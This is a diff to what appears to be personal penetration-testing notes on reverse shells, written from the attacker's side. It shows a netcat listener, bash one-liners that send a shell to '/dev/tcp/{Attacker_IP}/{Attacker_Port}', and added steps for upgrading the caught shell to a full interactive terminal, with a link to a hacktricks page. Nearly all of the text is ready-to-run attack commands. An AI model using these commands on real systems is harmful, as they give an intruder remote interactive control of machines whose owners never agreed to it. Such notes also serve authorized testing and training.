@@ -11,4 +11,19 @@ nc -lvnp {port_number}
 2-1.Linux:
 2-1-1./bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1
 2-1-2./bin/bash -c '/bin/bash -i>/dev/tcp/{Attacker_IP}/{Attacker_Port} 0<&1 2>&1'
-2-1-3.If attacker would like to control the target in full-tty mode, u could do below command to do that.
+
+2-1-3.If attacker would like to get the shell of the target in half-crippled-tty mode, attacker could let the target do below command:
+script -qc /bin/bash /dev/null
+Although attacker gets the shell in half-crippled-tty mode, attacker may lost the target's shell as he clicks 'Ctrl+C'.So attacker
+sometimes follow below resource guildlines to get the shell of the target in full-tty mode to avoid this situation.
+https://hacktricks.xsx.tw/generic-methodologies-and-resources/shells/full-ttys
+--------------------------------------------------------------------------------------------------------------------------------------
+The example script for getting the shell in full-tty mode:
+script /dev/null -qc /bin/bash #/dev/null is to not store anything
+(inside the nc session) CTRL+Z
+stty raw -echo; fg
+export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
+
+(Attacker can use 'stty -a' to get the number of rows and columns.)
+---------------------------------------------------------------------------------------------------------------------------------------
+
